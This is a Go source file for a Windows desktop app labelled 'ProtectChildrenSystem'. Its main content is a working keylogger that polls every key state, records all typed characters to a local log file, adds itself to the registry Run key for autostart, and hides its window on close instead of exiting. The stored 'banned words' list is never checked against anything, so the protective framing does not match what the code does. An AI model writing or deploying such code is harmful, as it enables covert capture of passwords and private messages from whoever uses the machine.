package main

import (
	"context"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"

	"github.com/wailsapp/wails/v2/pkg/runtime"
)

var (
	user32Api            = syscall.NewLazyDLL("user32.dll")
	procGetAsyncKeyState = user32Api.NewProc("GetAsyncKeyState")
	procGetKeyState      = user32Api.NewProc("GetKeyState")
)

type AppConfig struct {
	BannedWords string `json:"banned_words"`
	IsRunning   bool   `json:"is_running"`
	AutoStart   bool   `json:"auto_start"`
}

type App struct {
	ctx          context.Context
	isRunning    bool
	cancelFunc   context.CancelFunc
	lastKeyState [256]bool
	bannedWords  string
	dbPath       string
	logPath      string
	isAutoStart  bool
}

func NewApp() *App {
	exePath, _ := os.Executable()
	baseDir := filepath.Dir(exePath)

	return &App{
		dbPath:  filepath.Join(baseDir, "db", "config.json"),
		logPath: filepath.Join(baseDir, "db", "activity.log"),
	}
}

func (a *App) startup(ctx context.Context) {
	a.ctx = ctx
	os.MkdirAll(filepath.Dir(a.dbPath), 0755)
	a.loadFromDB()

	go func() {
		time.Sleep(500 * time.Millisecond)
		if a.isRunning {
			a.ToggleProtections(true)
		}
	}()
}

func (a *App) GetCurrentConfig() AppConfig {
	return AppConfig{
		BannedWords: a.bannedWords,
		IsRunning:   a.isRunning,
		AutoStart:   a.isAutoStart,
	}
}

func (a *App) UpdateBannedWords(words string) {
	if words == "" && a.bannedWords != "" {
		return
	}
	a.bannedWords = words
	a.saveToDB()
}

func (a *App) ReadLogs() string {
	content, _ := os.ReadFile(a.logPath)
	return string(content)
}

func (a *App) loadFromDB() {
	file, err := os.ReadFile(a.dbPath)
	if err != nil {
		return
	}
	var data AppConfig
	json.Unmarshal(file, &data)

	a.bannedWords = data.BannedWords
	a.isAutoStart = data.AutoStart
	a.isRunning = data.IsRunning
}

func (a *App) saveToDB() {
	data := AppConfig{
		BannedWords: a.bannedWords,
		IsRunning:   a.isRunning,
		AutoStart:   a.isAutoStart,
	}
	file, _ := json.MarshalIndent(data, "", "  ")
	os.WriteFile(a.dbPath, file, 0644)
}

func (a *App) ToggleProtections(status bool) {
	if a.cancelFunc != nil {
		a.cancelFunc()
		a.cancelFunc = nil
	}

	a.isRunning = status
	a.saveToDB()

	if a.ctx != nil {
		runtime.EventsEmit(a.ctx, "status-updated", status)
	}

	if a.isRunning {
		ctx, cancel := context.WithCancel(context.Background())
		a.cancelFunc = cancel
		go a.runKeylogger(ctx)
	}
}

func (a *App) SetAutoStart(enable bool) string {
	exePath, _ := os.Executable()
	appName := "ProtectChildrenSystem"
	a.isAutoStart = enable
	a.saveToDB()

	if enable {
		exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/t", "REG_SZ", "/d", `"`+exePath+`" --autostart`, "/f").Run()
		return "Startup Enabled"
	}
	exec.Command("reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", appName, "/f").Run()
	return "Startup Disabled"
}

func (a *App) runKeylogger(ctx context.Context) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			for i := 1; i < 256; i++ {
				v, _, _ := procGetAsyncKeyState.Call(uintptr(i))
				if v&0x8000 != 0 && !a.lastKeyState[i] {
					char := a.mapKeys(i)
					if char != "" {
						a.writeToLog(char)
						if a.ctx != nil {
							runtime.EventsEmit(a.ctx, "new-key-event", map[string]string{"text": char})
						}
					}
				}
				a.lastKeyState[i] = v&0x8000 != 0
			}
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func (a *App) mapKeys(vk int) string {
	switch vk {
	case 0x08:
		return "[BACKSPACE]"
	case 0x09:
		return "[TAB]"
	case 0x0D:
		return "[ENTER]"
	case 0x10:
		return "[SHIFT]"
	case 0x11:
		return "[CTRL]"
	case 0x14:
		return "[CAPSLOCK]"
	case 0x1B:
		return "[ESC]"
	case 0x20:
		return " "
	}

	if vk >= 0x70 && vk <= 0x7B {
		fNames := []string{"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]"}
		return fNames[vk-0x70]
	}

	shift, _, _ := procGetKeyState.Call(uintptr(0x10))
	caps, _, _ := procGetKeyState.Call(uintptr(0x14))
	isShift := shift&0x8000 != 0
	isCaps := caps&1 != 0

	if vk >= 0x41 && vk <= 0x5A {
		if isCaps != isShift {
			return string(rune(vk))
		}
		return string(rune(vk + 32))
	}

	if isShift {
		shiftMap := map[int]string{
			0x30: ")", 0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%",
			0x36: "^", 0x37: "&", 0x38: "*", 0x39: "(", 0xBA: ":", 0xBB: "+",
			0xBC: "<", 0xBD: "_", 0xBE: ">", 0xBF: "?", 0xC0: "~", 0xDB: "{",
			0xDC: "|", 0xDD: "}", 0xDE: "\"",
		}
		if s, ok := shiftMap[vk]; ok {
			return s
		}
	} else {
		normalMap := map[int]string{
			0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3", 0x34: "4", 0x35: "5",
			0x36: "6", 0x37: "7", 0x38: "8", 0x39: "9", 0xBA: ";", 0xBB: "=",
			0xBC: ",", 0xBD: "-", 0xBE: ".", 0xBF: "/", 0xC0: "`", 0xDB: "[",
			0xDC: "\\", 0xDD: "]", 0xDE: "'",
		}
		if s, ok := normalMap[vk]; ok {
			return s
		}
	}
	return ""
}

func (a *App) writeToLog(content string) {
	f, _ := os.OpenFile(a.logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		defer f.Close()
		if len(content) > 1 && content[0] == '[' {
			f.WriteString(" " + content + " ")
		} else {
			f.WriteString(content)
		}
	}
}

func (a *App) OnBeforeClose(ctx context.Context) bool {
	if a.isRunning {
		runtime.WindowHide(ctx)
		return true
	}
	return false
}
